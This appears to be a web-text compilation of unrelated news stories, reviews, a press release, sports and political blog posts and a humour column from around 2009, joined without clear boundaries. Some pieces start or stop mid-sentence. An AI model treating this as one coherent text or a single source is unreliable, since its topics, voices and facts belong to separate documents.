Joel can be pretty persuasive , though , especially when he mentions that he travels a lot and will need someone to use his season baseball tickets and usually “ just gives them to the guys in the Morning Road Bike Club . ”
I decided I could probably get my body out of bed at sunrise if I explained to it that I would be feeding it plenty of beer and hot dogs at a future baseball game .
Joel loaned me a shiny , multicolored bike - riding outfit that looked like he had stolen it from the Justice League of America .
Road bikers wear bright outfits like this so that they are easier to see and laugh at .
The shorts were made of spandex , a fabric with a stretch tolerance of 300 percent .
By my calculation , I was at 299 , meaning if I ate anything larger than a peanut my shorts would explode off my body .
So tightly was I gripped by this girdle , all the fat from my belly button to my knees was forced upward like a tube of toothpaste .
My legs are scrawny to begin with — in this getup , I looked like a pregnant stork .
He also lent me a helmet so lightweight it felt like it would protect me about as well as a paper bag .
I did n’t like the idea that I would be needing such a thing .
“ Why do n’t we just agree that I ’ll do whatever it takes not to fall on my head , including , if necessary , remaining a safe distance from the bicycle ? ” I proposed to Joel .
“ Ready for your first ride ? ” Joel enthused .
“ I ’m more ready for my last bike ride , ” I countered .
“ What row did you say your seats are in ? ”
Joel laughed as if it was funny that someone would pretend to bike for baseball tickets instead of the sheer joy of spending an hour hunched over a machine made obsolete by the invention of internal combustion .
The pedals of the bike had been replaced with two hostile prongs that clipped to my shoes with an evil snap , holding my feet hostage .
This ensures that , once the biker is pedaling fast enough , his legs will be ripped off at the knees .
It turns out there are two types of road bikers : bikers who are faster than me , and me .
And you can imagine my horror when , after 10 minutes of cycling , we rode right past a doughnut shop .
You ca n’t ride past a doughnut shop without stopping — it defies the whole point of the place .
I swung into the parking lot , came to a stop and , because my feet were clipped in , fell over like a dead tree .
Luckily , I was wearing the helmet on my head , so the only thing I hurt was everything else .
Turns out , if you lie pinned under a bicycle long enough , doughnut - shop employees will bring you cinnamon rolls .
But Joel seemed disappointed to find me sprawled there as if modeling for a chalk outline .
I just hope I ’m still getting baseball tickets .

Even as Apple has insisted it 's content to give AT&T exclusive access to the iPhone , a closer look at Apple 's own devices — and a likely dead - end in growth through its existing carrier strategy — shows that Apple may have little choice but to sell its smartphone through Verizon and other carriers by 2011 at the latest .
A research note from Citigroup sent out late on Tuesday stresses that the US cellular market is quickly hitting a wall in terms of growth and that even the iPhone can't save AT&T from the same fate .
Although Apple 's handsets may have saved AT&T in the last quarter by improving the company 's bottom line and preventing dramatically reduced subscriber additions in the midst of an economic collapse ; the American wireless industry as a whole is only likely to grow 1 to 3 percent per year from here on out , analysts say .
Much of the growth in other carriers in the early part of 2009 was ultimately due to Sprint customers abandoning their carrier rather than true expansion .
As such , Apple under its current tactics is more and more likely to end up selling only to existing AT&T customers and to serve iPhone users replacing their earlier devices , neither of which is likely to grow quickly .
Citigroup does n't see any mobile platform , including Apple 's , ever garnering more than a quarter of AT&T 's customers and already sees Apple representing as much as 18 percent of the carrier 's base by 2010 .
It may also become increasingly difficult for AT&T to offer more incentives and extend iPhone exclusivity any later than 2011 , as the potential for more customers elsewhere may be too strong for Apple to ignore by that year .
The hard ceiling on expansion , in turn , means Apple can't afford to leave money on the table by artificially limiting who can buy an iPhone in the US .
Instead of selling to just a fraction of AT&T 's 78.2 million customers , Apple is predicted to have access to as many as 150 million customers across Verizon , Sprint and T - Mobile if it chooses not to renew its exclusivity contract .
Estimates have Apple 's likely actual customer base nearly doubling from 17 million to 30 million users .
The Cupertino company would have to accept a hit to its jealously - protected high profit margins but could well generate more revenue in addition to expanding its market share .
That may play into Apple 's expressed preference for sticking to one device .
While Apple 's only avenue to expand the iPod 's market share was to release lower - cost models , expanding the iPhone 's footprint is described as possible if the electronics giant simply agrees to lighten the steep subsidies it wants on each phone in return for the rights to sell iPhones beyond AT&T .
Technical hurdles that would force a second model are also less likely to be a concern .
Notably , Qualcomm is known to be making a hybrid CDMA and Long Term Evolution ( LTE ) chipset for mid-2010 that would let users make calls on Verizon 's existing CDMA phone network but have access to its 4G , LTE - based network when it goes live the same year — and roughly when the current deal is likely to expire .
Accordingly , while Apple has publicly decried CDMA as a dead technology , the Qualcomm chip could let Apple take advantage of Verizon 's network for at least the next few years — a gain Citigroup sees as likely worth the extra customers it would bring .
Verizon alone could add between 10 - 20 million new iPhone users within 5 years , but it would also open the door to Sprint and would grant access to those few Chinese and Indian cellular networks that depend on CDMA .

Advertisement A 10 - year - old girl has suffered burns over 70 % of her body after spending 16 minutes on an unsupervised sun bed .
Kelly Thompson had to be treated overnight at a burns unit in Swansea and her mother wants an investigation .
" The doctors told me if she had stayed on the bed two minutes longer , she may have needed skin grafts , " her mother Sharon Hannaford , of Port Talbot , said .
A spokesperson for the Electrik Avenue tanning centre said they were due to meet council health officials .
The incident happened over the Easter holidays and Ms Hannaford has called for the salon to be closed down .
Kelly paid £ 8 to use the sunbed at the salon
She said she had given Kelly money for a visit to the fair with an older cousin .
" When they got there the funfair was closed so they went into town and decided to use the tanning centre .
" Kelly put £ 8 into the machine which gave her 16 minutes on the sun bed .
" She was under - age but there was no staff there to stop her from using it .
" And there was no - one to give advice on using these potentially dangerous machines . "
" She had burns over 70 % of her body and was off school for a week . "
A sign on the door at the Electrik Avenue tanning centre reads : " Strictly over 16s only . "
Neath Port Talbot council confirmed it was investigating the incident .
The case emerged as the Health and Safety Executive ( HSE ) changed its advice for operators of sun beds in Wales and England .
The tanning salon said it would meet council officials on Friday
It recommended that people under 18 should not use sun beds , and that all coin - operated salons should be supervised by trained staff .
The HSE said the new guidance would bring it into line with the latest World Health Organisation advice .
Giles Denham , the policy director at the HSE , said : " We understand that some people may want to use sun beds .
Our guidance is designed to ensure they have the information to minimise the associated risks .
" That 's why we recommend that owners ensure their salons are staffed all the time , even if they are coin-operated , and that UV tanning equipment is not used by people under 18 . "
Bill Dickson , director of the Welsh Centre for Burns and Plastic Surgery at Morriston Hospital , where Kelly was treated , said burns from overusing sun beds could be a danger .
" One of the worries is the exposure to ultra-violet rays and the links to developing malignant melanoma .
Cases of malignant melanoma have shown to be increasing in younger people , " he said .
" The majority of burns we see from sun beds are superficial but can be very painful .
It might be that we would need to treat the skin with dressings but there could be a very real danger of long - term scarring depending on the extent of the burn . "

Nina Goad of the British Association of Dermatologists said : " This is yet another case that illustrates why compulsory regulation of the sun bed industry is long overdue .
" Unmanned , coin - operated sun beds need to be banned , as children of any age can use them , and there is no limit to the amount of time you can spend on such devices .
This can lead to serious health problems , including skin cancer . "
Kathy Banks of the Sunbed Association said unstaffed salons only made up about 150 of the 6,000 tanning centres in the UK .
" Certainly we do not allow unstaffed tanning salons into membership , we do n't support them and we also support any campaign to take action against them and force them to be closed down or force them to be staffed , " she told BBC Radio 5 Live .
Julie Barratt , director of the Chartered Institute of Environmental Health , said it was clear allowing the industry to self - regulate was not working .
" Unmanned sun-tanning salons are a particular problem as they are subject to no controls at all .
" The only way we can protect young people from this sort of self - inflicted damage is to control the use of sun tanning faculties by legislation . "
In February , a 14 - year - old girl was burned after spending 19 minutes on a sun bed at an unstaffed salon in Barry , Vale of Glamorgan .
Kirsty McRae was put on a drip and given oxygen in hospital after receiving first degree burns , the lowest level of skin burn .

WHAT'S ON TV TONIGHT ?
If only we had more billionaires to solve our problems , how happy we all would be .
If you 're buying that , has NBC got a show for you :
The Philanthropist , an odd action / adventure about a super - rich , globe - trotting philanthropy vigilante .
If not , then what you have is a well - acted , well - intentioned , incredibly preposterous show that would struggle even if it were in step with the times , rather than marching to its own prosperous drummer .
But that 's NBC :
If it did n't have a tin ear , it would have no ear at all .
Still , give the network credit for eventually catching the nation 's mood and downgrading this once high - profile project to a summer run , because summer is its greatest asset .
For a few weeks ,
The Philanthropist will let a fine if ill - used cast take us on a tour of global hot spots : Nigeria this week , Myanmar the next .
When it comes to scripted broadcast shows , you wo n't find a much better offer .
Written by Tom Fontana , this short - run series stars Rome 's James Purefoy as tycoon Teddy Rist .
Teddy is loosely based on a real person , but no matter :
The Philanthropist has no more to do with actual philanthropy than Superman does with journalism .
The only thing that rings even remotely true is Purefoy himself , who once again proves to be a roguish charmer of the first order .
Told in an overly fussy style , Teddy 's story begins when he rescues a Nigerian child from a flood , causing him to forget about his latest deal and concentrate on getting some vaccine to the child 's village .
Obviously , this worries his co-workers , a sturdy group that includes Jesse L. Martin , Neve Campbell and The Wire 's Michael Kenneth Williams .
Though there is great appeal in the idea of a selfish man suddenly seeing beyond himself to the suffering around him , there is also more than a whiff of Rudyard Kipling 's " white man 's burden " in the way the story is told .
The pilot tries to balance that impression through an African doctor who criticizes Teddy 's motives — but she ends up sleeping with him , which shifts the story from Kipling to James Bond .
Ultimately , though , it 's the " tycoon " part of Teddy that makes The Philanthropist so deeply silly .
There he is , stumbling barefoot through the jungle with his one bag of vaccine , surviving more by luck than skill , when he clearly would have done the village a better service by buying the vaccine in bulk and hiring someone competent to deliver it .
It 's called capitalism .
We do n't expect much from billionaires these days , be we do at least expect them to grasp that concept .

Pierce and his son were on a ski trip in France , where there happens to be a paucity of English - language television .
To stave off the boredom , out came the laptop and its Vodafone data card .
Vacation saved by internet downloads of Clarkson and friends , father and son returned home to a £ 21,716 ( $ 30,334.40 ) internet service bill .
Needless to say , the humongous charge was something of a surprise .
Thankfully , Vodafone kindly waived Pierce 's fees with an admonition to check his plan and whether it covers massive data downloads while in other countries .
So , the next time you find yourself in foreign lands with time to burn and a hankering for some quality Stigtime , well ... consider yourselves warned .

I ’ve been spending way to much time on my iphone lately and It ’s been becoming a little unresponsive .
When I scroll I notice the refresh rate is delayed and loading programs like phone , sms and safari are delayed .
At first I thought that my theme was the cause but even after turning off all winterboard effects I still have the same problem .
I decided to research the issue and here are my results .
The iphone is said to never shut a program down so the memory of the device is getting saturated .
To cure this you need to reset the device .
You would think that powering down and back up again would do this but apparently you need to hold the power button and the home button at the same time until the iphone shuts down .
Remove unused programs .
As soon as I got rid of a few of the apps that I never use the phone started responding a lot quicker but still not quick enough .
Turn off ssh .
Running the ssh daemon in the background is using resources .
If you ’re not scp’d or ssh’d into the phone at the moment then why do you have it running ?
Turn off the GPS services .
If you need it then turn it back on .
In Settings => General click “ Location Services ” to off .
This will also help with battery life on the iphone .
If you ’re suffering from SMS lag I ’ve read that opening and closing the app store solves the problem on the iphone .
Mostly straight forward but still useful .
I ’ve found that Winterboard does not cause any lag whatsoever .
I ’ve tried multiple themes and played around with each and they do n’t seem to lag the phone out at all .
( from Volkswagen Press Release )
At the 42nd Annual Meeting of Stockholders of Volkswagen AG in Hamburg , the most economical car in the world is presented : the 1 - litre car .
The prototype , which until now has been kept closely under wraps , and which many people never believed could be built , was driven under its own power from Wolfsburg to the Annual Meeting in Hamburg .
Before the Annual Meeting , the current Chairman of the Board of Management , Dr. Ferdinand Pi�ch , drove this research vehicle to Hamburg from the company 's headquarters at an average fuel consumption of 0.89 litres per 100 kilometres .
This has once against impressively demonstrated Volkswagen 's position at the cutting edge of modern technology .
The objective of developing a roadworthy vehicle that consumes just 1.0 litre of fuel per 100 kilometres could not be achieved through compromise .
All existing technical solutions were examined , and in close cooperation with numerous suppliers , replaced by better , and principally lighter versions .
The result is a vehicle that looks more like a sports car than a typical research vehicle .
The conceptual necessity for a small frontal area led to an unusually narrow and very flat body form being chosen .
The body was developed in a wind tunnel , is 3.47 metres long , but just 1.25 metres wide and just over a metre in height , and is made completely of carbon fibre composites .
To save weight , it is of course not painted .
The carbon - fibre - reinforced outer skin is tensioned over a spaceframe that is not made of aluminium , but rather of magnesium , which is even lighter .
The 1 - litre car is powered by a one - cylinder diesel engine , centrally positioned in front of the rear axle and combined with an automated direct shift gearbox .
The crankcase and cylinder head of the 0.3 - litre engine are of an aluminium monobloc construction .
The naturally aspirated , direct - injection diesel engine employs advanced high - pressure unit injection technology to generate 6.3 kW ( 8.5 bhp ) at 4,000 rpm .
This gives the vehicle , which weights just 290 kg , an astonishingly lively temperament .
Fuel consumption is a mere 0.99 litre per 100 kilometres .
With a 6.5 - litre tank , this gives a range of some 650 kilometres without refuelling .
Due to the restriction of space , it was not possible to adapt an existing gearbox .
For this reason , a compact , automated 6 - speed gearbox is employed , which is controlled from a turn switch in the cockpit .
Running gear made of lightweight alloy , tyres that offer optimised rolling resistance and 16 - inch wheels made of extremely lightweight composite material perfectly complement the economical drive system .
The interior is sportingly simple in design , yet offers enough space for two people , who can comfortably get in after folding back the turret - like gullwing door .
An extremely lightweight construction has also been employed for the seats .
The seat frames are made of magnesium , and firm , yet comfortable fabric covers are used instead of a classic upholstery .
Despite the lightweight construction of all components , safety has been a major element in all phases of the development of the 1 - litre car .
For example , the concept vehicle 's safety equipment includes anti-lock brakes , ESP electronic stability program and a driver 's airbag .
Deformation elements at the front end and the spaceframe construction provide impact and roll - over protection comparable to that of a GT racing car .
The sports - car - like design demonstrates that Volkswagen 's 1 - litre car is not a spartan research vehicle , but a high - tech special vehicle .
It starts with the special seating arrangement .
The driver and passenger sit centrally as if in a monoposto , but in tandem .
The mid-engine is installed transversely in front of the rear axle .
With its complex design ( double wishbones at front , DeDion suspension at rear ) and combined with the low centre of gravity and low overall vehicle weight , the lightweight running gear results in very agile handling .
The project team have impressively succeeded in combining driving pleasure with a level of fuel consumption never seen before .
The 1 - litre car also incorporates numerous details of a practical and convenient nature .
For example , there is an easily accessible stowage compartment with a capacity of 80 litres under a separate flap in the rear ; a reversing camera that helps when manoeuvring ; automatic locking / unlocking of the gullwing door and a starter button in the cockpit that together allow keyless operation .
The past few weeks have n’t been good ones for religious bigots .
First Iowa and Vermont legalized same - sex marriage in rapid succession ; soon afterwards , the state legislatures of New Hampshire and Maine passed marriage - equality bills .
( If you live in either state , contact your governor and tell him to sign them ! )
And now , this stunning poll result from Nate Silver ’s fivethirtyeight.com , Two National Polls , for First Time , Show Plurality Support for Gay Marriage :
… a new poll from ABC News and the Washington Post gives gay marriage an outright plurality , with 49 percent of adults supporting gay marriage and 46 percent opposed .
… a CBS / NYT poll put support for full marriage rights at 42 percent , versus 25 percent for civil unions and 28 percent for no legal recognition .
This represents a significant increase from an identical CBS / NYT poll in March , where the numbers were 33 percent for marriage , 27 percent for civil unions , and 35 percent for no recognition .
Read that last paragraph again : support for marriage equality has advanced almost ten points in just a month , such that it now commands a decisive plurality .
Combined with the civil - unions position , there ’s a two - to - one majority nationwide in favor of granting benefits to same - sex couples .
It can now very plausibly be argued that the judges who ’ve ruled in favor of equality are upholding the will of the people , not denying it .
We ’re on the verge of a sea change in American civic life , thanks to a gay - rights movement that ’s made far more progress than seemed imaginable even just a few years ago .
And as history leaves them in the dust , the religious right is increasingly going into full meltdown mode .
They ’ve used absurdly overheated and hysterical rhetoric in the past , but this time they ’ve truly outdone themselves .
Witness Orson Scott Card , a Mormon and board member of the “ National Organization for Marriage ” who ’s previously proclaimed atheists unfit to be president .
But even that idiocy is nothing compared to the full - tilt frothing lunacy on display in an anti-gay - marriage screed he recently published in the Mormon Times ( HT : Americablog ) .
In it , he calls same - sex marriage “ the end of democracy in America ” and urges citizens to revolt against any government that permits it :
Why should married people feel the slightest loyalty to a government or society that are conspiring to encourage reproductive and / or marital dysfunction in their children ?
… What these dictator - judges do not seem to understand is that their authority extends only as far as people choose to obey them .
How long before married people answer the dictators thus : Regardless of law , marriage has only one definition , and any government that attempts to change it is my mortal enemy .
I will act to destroy that government and bring it down , so it can be replaced with a government that will respect and support marriage , and help me raise my children in a society where they will expect to marry in their turn .
Card is n’t the most prominent member of the religious right to call for armed rebellion because the government wo n’t cater to his wishes .
He ’s not even the first .
( Rick Perry may have that honor , along with a substantial portion of the Texas Republican Party . )
But it is frightening that , as society moves away from accepting their views , these calls for revolution become more and more common among them .
What this shows , I think , is that the religious right is unwilling to participate in the social contract : the understanding that we all have a voice in directing the course of the state , but the price of that freedom is not always having one ’s own way .
The religious right has no interest in that bargain .
If they do n’t get to win , they do n’t want to participate .
And as soon as events are not going their way , they immediately begin calling for armed revolt and insurrection , determined to achieve their goals by violence if they can’t achieve them by democracy .
The most insane aspect of this is that no one is taking away any of their rights – their clamoring for rebellion is purely because they can no longer control the lives of others .
This is anti-Americanism in its purest sense : the refusal to accept the democratic bargain that is the very essence of our nation .
And as the fringe members of their movement are increasingly tipped over the edge into real violence by their leaders ’ reckless words , the people who speak those words increasingly bear moral responsibility for the bloodshed they create .
The one bright side to all this is that , the more extreme and overheated anti-gay rhetoric becomes , the more moderate Americans will become repelled and will flock to the progressive side .
We ’ve already seen this in polls that show a continuing exodus from the Republican party .
There may come a point where sensible Republicans realize how this issue is destroying them , cut ties with the religious right , and become a real opposition party worthy of being taken seriously again .
Or they may continue to ramp up their rhetoric as they dwindle into permanent irrelevance .
Either option suits me fine .

with a police stun gun outside Hawthorne middle school .
It all started when the boy , that ’s also an African American , did n’t want to line up for his photograph during a photo day at school .
He started running around the school with a school ’s security guard chasing him and trying to rush and detain him .
Police lieutenant Michael Ishii said that the boy assaulted a security guard and kicked a police officer .
The school called the boy ’s family , but when his sister wanted to interrupt she was pushed back by the police , though they claimed that she spoke to him and could n’t calm him down , so they decided to shoot him with a 50 000 volt Taser .
“ To watch my brother shaking on the ground , it was very traumatic , ” the sister said .
The boy urinated himself and was immediately taken to a medical center to have two electrode darts removed from his back .
The issue of using Tasers on children has become controversial in recent years and more research is needed to determine the health effects of shocking small children , still the Hawthorne police chose to use it on the autistic boy .
The attorney said that if the boy successfully completes a counseling program , a criminal case will not be filed against him .

New York based Leeser Architecture has won a competition for the design of the Helix Hotel that is to be built in Zayed Bay in Abu Dhabi , United Arab Emirates .
Called the Helix Hotel for its staggered floor plates , it rests in the bay , partially floating in the water and adjacent to the serpentine Sheik Zayed Bridge currently under construction by designer Zaha Hadid .
With the Helix , Leeser Architecture has devised a new way to consider hotel culture in the Emirates , highlighting elements that are usually unseen , and playfully enlivening those parts that traditionally remain static and mundane .
Zayed Bay will be a comprehensive development built along a new road , and the site will include office buildings as well as condominiums and retail along the water .
The Helix is the centerpiece of this new development .
Visit Leeser Architecture ’s website – here .
From Leeser Architecture :
With 208 guest rooms and suites arranged around a helical floor , the hotel immediately dispenses with the idea that visitors must engage in the stale paradigms of rigid hallways and atria that characterize a typical hotel stay .
The floor constantly shifts in width and pitch as it rises to the top floor , keeping public spaces always in flux .
No two rooms positioned across from each other have exact views to the other side , already pulling the visitor out of the pedestrian and into the hotel ’s uniquely urban world .
As the helix winds upward , programmatic elements change from lounges and restaurants on the bay , to meeting rooms and conference facilities , to lounges and cafes , to the luxury indoor - outdoor health spa on the fifth floor , to , finally , the upper pool deck on the roof .
The running track on the fifth floor represents the only moment when the ramping ceases and a flat surface prevails – a sleight of hand on the architect ’s part , and an unexpected luxury that fit vacationers can enjoy in the cooler months .
Conceptually , the Helix Hotel participates in a critical dialogue between opulence and urbanness , between the variety of services offered by a small city and the demands of a five - star hotel guest .
The floor suggests the curves a winding street would take through a bustling town , and many programmatic elements are open to views from across the central void .
Though the void seems to offer unmitigated visibility , there are enclaves for private meetings and guest privacy .
It is designed so that one activity feeds into the next rather than affecting sharp separations between each activity .
In this way it develops a feeling of being free to whimsically experience all aspects of the hotel without having to decide on an agenda in advance .
On the luxury side of vacation culture , there are playful elements that make the hotel a designer destination in an iconic setting .
From the outset , it is as much a showplace for the abundance of opulent life as it is a fully incorporated urban experience .
For example , the building has a functional reverse fountain , which drops water from the ceiling down through the void to the lower lobby .
At the entry , valets drive clients ’ cars into the car park , which , rather than being predictably aboveground or underneath the hotel , is situated instead under the bay .
Cars are literally driven into the water .
As guests make their way up to their suites , remarkable views out onto the Zayed Bay become even more dramatic on the upper floors .
At the top of the Helix , the rooftop pool deck features a full sized swimming pool with a glass bottom , with the water and swimmers visible from eight floors below at ground level .
In the restaurant below the lobby , the bay ’s waves are so near to the floor plate that they lap up onto the edge of the restaurant inside of the glass curtain wall .
The wall retracts , revealing a sweeping breeze .
While focusing on unique design , Leeser Architecture is also committed to sound sustainability practices and worked with consultant Atelier Ten to determine the best possible conditions and materials for heat and energy conservation .
The indoor waterfall allows for the accumulation of heat inside the hotel to be minimal by filtering cool water back up into the system as it falls through the void .
In the sub -lobby , a dynamic glass wall is built from the base of the second floor down into the water .
The wall acts as a curtain would , opening when the weather is cool enough and closing when it is too hot for exposure to the desert air .
Portions of the outside surface are clad in panels made of a new material called GROW , which has both photovoltaic and wind harnessing capabilities .

RESIDENTS of a Hendon road today reacted with mild amusement at the news that a home in their close - knit community had been used to grow thousands - of - pounds worth of drugs .
A five - bedroom , semi- detached house in Downage was raided last week by police , who discovered the largest ever haul of cannabis plants in the borough .
Eiran Rotenberg , 36 , drove past the house shortly after it was raided by police .
" It was literally lit up like a football pitch at night , " he said .
" It was broad daylight but the glare coming out was blinding .
You needed sunglasses .
" I assumed it was either a film set or a drug house .
A policeman told me : ' your next door neighbour 's been running a drug factory ' .
" It was more amusing than anything else . "
He said the direct neighbour had suspicions after the tenants moved into the house at 1am .
But he added : " From that point on there were no visitors , no comings and goings . "
Another neighbour , Danielle Garbacz , 18 , said : " I never saw anyone coming or going from the house .
It was quite strange as I know all the other people living here .
" We 're all friends around here , everyone knows each other . "
I think the clock is about done ticking for Eric Wedge .
The Indians found yet another way to blow a big lead last night against the Royals giving up two ninth - inning homers to lose , 6 - 5 .
The writing is on the wall .
Wedge only started realizing about three weeks ago that his bullpen is terrible .
Jensen Lewis and Jeremy Sowers have been awful almost every appearance .
Kerry Wood has self - destructed three times already this season .
Tony Sipp is tough but used in the wrong situations .
The Indians starting pitching has not been brilliant , but will not be blamed when the axe falls on Wedge .
After the first couple of weeks of the season , the rotation has been solid .
The offense does not blow 4 , 5 , 6 , and even 7 run leads .
Seven runs should be plenty for a team to win a game .
This bullpen would have trouble getting jobs at Burger King right now .
Wedge will be gone , I say no later than the end of June .
Why ?
For one he is not a verbal leader .
He is passive and used to just watch the inner-destruction from the bench .
Feeling the heat , he has gotten a bit more assertive , but pales in comparison to longtime winners Lou Piniella , and even Dusty Baker .
Those guys are screaming at their players when they need to , not screaming about them way after the fact .
Cleveland is next to last in MLB attendance for a reason .
Part of it is because they have the second worst record .
The most disturbing thing I have heard in years was that Cleveland might consider trading Victor Martinez rumors which are already swirling .
HEY MANAGEMENT !
Take notice .
You are in the weakest division in baseball and until you are mathematically eliminated , you have a chance to win it .
Do n’t start dumping players unless they are in the bullpen when the game starts .
How Jensen Lewis is still on the roster is beyond me .
Kerry
Wood will be able to start carpooling to The Cleveland Clinic with his new pal , Travis Hafner .
Once
Wood reaches a degree of failure , he will say he is hurt so he has something to pin it on .
I do not have a crystal ball — but watch , see if I am wrong .
In closing , thanks Eric , you have been a good guy .
The promo tours you do in the offseason , the pat you give Jensen Lewis on the back after he gives up a big lead when you know you want to put your cleats in his ear , and the rough faced “ I am struggling ” look will all be missed but not unappreciated .
MANAGEMENT !
Go to the bullpen , Mike Hargrove is loose and ready to enter the game !
United Nations officials in Afghanistan are attempting to create a " flood of drugs " in the country intended to destroy the value of opium and force poppy farmers to switch to legal crops such as wheat .
After the failure to destroy fields of the scarlet flowers in Afghanistan 's volatile south , the United Nations Office on Drugs and Crime says the answer is to stop the drugs from leaving the country in the first place .
" Manual eradication is incompetent and inefficient , " UNODC chief Antonio Maria Costa said during a visit to the western Afghan province of Herat .
" So we want to see more efforts to stop the flow of drugs across Afghanistan 's borders and the hitting of high - value targets to create a market disruption .
" We want to create a flood of drugs within Afghanistan .
There will be so much opium inside Afghanistan unable to go out that the price will go down . "
Officials admit that the plan is a second - best solution to intensive eradication campaigns .
Last year the Afghan government succeeded in destroying only 3.5 % of Afghanistan 's 157,000 hectares of poppy because eradication teams were either attacked or bought off by local drug lords .
But the attempt to use brute economics to tackle the country 's $ 4bn ( £ 2.5 bn ) narcotics industry instead is fraught with problems – not least Afghanistan 's thousands of miles of porous borders .
Costa got a first - hand view of that issue this month from the porthole of a UN helicopter chartered to fly along a portion of the 580 - mile border that separates Afghanistan from Iran .
The vast swaths of desert are thinly populated with a scattering of mud brick villages , and there is little to stop smugglers crossing the border .
While the Iranians , fed up with the problems created by the country 's 1 million heroin addicts , have taken steps to build ditches and walls along the frontier , the Afghans lack even a fraction of those resources .
On the Afghan side of the border , Costa visited one of 24 squalid border checkpoints supported by a sprinkling of EU money , where the commanding officer told the UNODC chief that his men needed heavy weapons to defend themselves against the much better armed smugglers who race through the huge gaps in the border .
The task of beefing up Afghanistan 's defences on this vast stretch of border is supported by just two UNODC officials , and they say that while their Afghan colleagues have been ready for months to start joint border patrols with their Iranian counterparts , progress has stalled because of bureaucratic infighting between ministries in Kabul .
Their efforts have been further undermined by a recent decree by President Hamid Karzai to close down small cross - border markets which had been a source of economic activity in an otherwise barren wilderness .
The local UNODC officials say the decision by Karzai , apparently taken to protect customs revenues , is " killing the villages " .
The governor of Herat province , Ahmad Yusef Nuristani , said young people in the border areas had no choice but to join the drug smugglers to survive .
" They were trading areas that kept people busy with legitimate businesses so they would not be tempted into employment by the drug traffickers , " Nuristani said .
Even without attempts to disrupt the flow of drugs out of the country , Afghanistan is doing a good job of destroying the value of its main export .
Huge overproduction , which by some estimates twice outstrips world demand , has led to a steady fall in the value of opium .
A kilogram is now worth less than one fifth of what it was in 2001 .
The slump in opium values , combined with last year 's soaring worldwide price of wheat , fuelled hopes that farmers would switch crops .
However , wheat has fallen by 30 % since October and humanitarian handouts of imported wheat last winter also helped to keep prices in Afghanistan low .
Costa said his request that the World Food Programme buy only Afghan wheat had been rejected by " free market ayatollahs who think political stability is less important than free market principles " .
The UNODC country chief , Jean - Luc Lemahieu , also warned that the strategy of capitalising on falling opium prices could be torpedoed by Chinese drug dealers looking to Afghanistan to supply China 's growing army of heroin addicts .
" I think we have a two - year window before the Chinese pick up on the Afghan market .
Currently the Chinese dealers source their heroin from the Golden Triangle .
The networks have not yet been established . "
Can a domain name help save the environment ?
An effort is now underway to create a new top level domain ( TLD ) called .eco , which would aggregate environmental information about organizations and individuals along with a .eco domain name .
The .eco TLD is being proposed to ICANN ( Internet Corporation for Assigned Names and Numbers ) as part of a new expansion of domain names set to occur in 2010 .
Backers of .eco are aiming for the proposed TLD to become a trust mark for environmental and sustainability information .
" I think .eco makes a lot of sense intuitively to people as a place to get green information , " Trevor Bowden co-founder of .eco bidder Big Room told InternetNews.com .
" We wanted to go beyond just selling domain names and raise awareness .
We want to build a useful tool and platform . "
Bowden noted that in addition to the administrative and technical details that someone would normally disclose when buying a domain , .eco will make companies include eco-information disclosure .
The types of information that could be included in a .eco registration are many .
" A lot of eco-information that companies produce about themselves or their products is dispersed and difficult for consumers to find , so we want to be a transparency solution , " Bowden said .
" We could ask registrants whether their product has an eco label or if their company produces a sustainability report . "
Other information could include membership information in environment organizations or efforts .
As well , the .eco TLD could potentially include energy use information and data from smart meters .
The target market for the .eco TLD could be Fortune 500 companies , which Bowden noted might be inclined to run .eco in parallel to their existing .com domains .
The .eco site would be the place where the companies aggregate all of their green information .
The .eco TLD is n't just being proposed for big vendors ; Bowden commented that it could be useful for small business and individuals , too .
According to Bowden , millions of small businesses are looking for a reporting framework that could demonstrate their environment progress and that framework could be .eco .
Additionally , .eco could be used by individuals to track their own environmental activities and footprint .
Getting a .eco Domain
ICANN is set to take proposals in early 2010 for new TLDs , which is when Big Room will formally submit their proposal for .eco .
Bowden said that his group has been working on the .eco bid for almost two years at this point .
As part of the bidding process , Big Room will pay ICANN a fee of $ 185,000 and will need to ensure that they have a complete submission .
Part of that involves the technical back end that will manage the TLD .
Big Room has partnered with Afilias , the manager of the .org and .info TLDs , to help manage the proposed .eco TLD .
" There will be an evaluation process all applicants will have to go through , " Bowden said .
" We would love to see .eco up and running in 2010 but it will be dependent on the evaluation process and the speed with which application are evaluated by ICANN . "
NEW HAVEN , Conn . —
A chimpanzee that mauled a Connecticut woman had the anti-anxiety drug Xanax in its system , toxicology test results show , but investigators have n't determined whether the drug played a role in the attack , a prosecutor said today .
More news coverage of chimpanzee mauling
Authorities are still weighing whether to file criminal charges against the chimpanzee 's owner , Sandra Herold , said Stamford State 's Attorney David Cohen .
The 200 - pound chimp , named Travis , attacked Stamford resident Charla Nash on Feb. 16 .
She lost her hands , nose , lips and eyelids in the attack .
Doctors at Ohio's Cleveland Clinic say she is blind and faces two years of surgical procedures .
Nash 's family has sued Herold for $ 50 million .
The suit alleges , among other things , that she had given Travis medication that further upset the animal .
Herold has made conflicting public statements about whether she gave Travis Xanax the day of the attack .
Police say the drug was not prescribed for the animal .
Telephone messages left for attorneys representing Herold and Nash 's family were not immediately returned .
Herold 's attorneys have said there was no way to predict Travis would attack Nash .
On the day of the attack , Herold called Nash to her home to help lure the animal back into her house .
Herold has speculated that the chimp was trying to protect her and attacked Nash because she had changed her hairstyle , was driving a different car and was holding a stuffed toy in front of her face to get Travis ' attention .
The attack lasted about 12 minutes , and ended when police fatally shot Travis as he attempted to open a police cruiser 's door .
Herold owned the 14 - year - old chimp nearly all its life , dressed the animal and fed it human foods .
When he was younger , Travis starred in TV commercials for Old Navy and Coca - Cola , made an appearance on the " Maury Povich Show " and took part in a television pilot .
It 's easy !
If the CIA says one thing and former Sen. Graham says another , then the CIA is lying .
Or , " in error , " if you prefer .
( Background here and here , in which Graham says that some of the briefings in which he was allegedly filled in about waterboarding and related techniques never occurred .
This matters , because the CIA 's claims are part of the same argument that Nancy Pelosi and other Democrats in Congress had known about and acquiesced to waterboarding all the way along . )
Part of the payoff of reaching age 72 and having spent 38 years in public office , as Graham has , is that people have had a chance to judge your reputation .
Graham has a general reputation for honesty .
In my eyes he has a specific reputation for very good judgment : he was one of a handful of Senators actually to read the full classified intelligence report about the " threats " posed by Saddam Hussein .
On the basis of reading it , despite a career as a conservative / centrist Democrat , he voted against the war and fervently urged his colleagues to do the same .
" Blood is going to be on your hands , " he warned those who voted yes .
More relevant in this case , Graham also has a specific reputation for keeping detailed daily records of people he met and things they said .
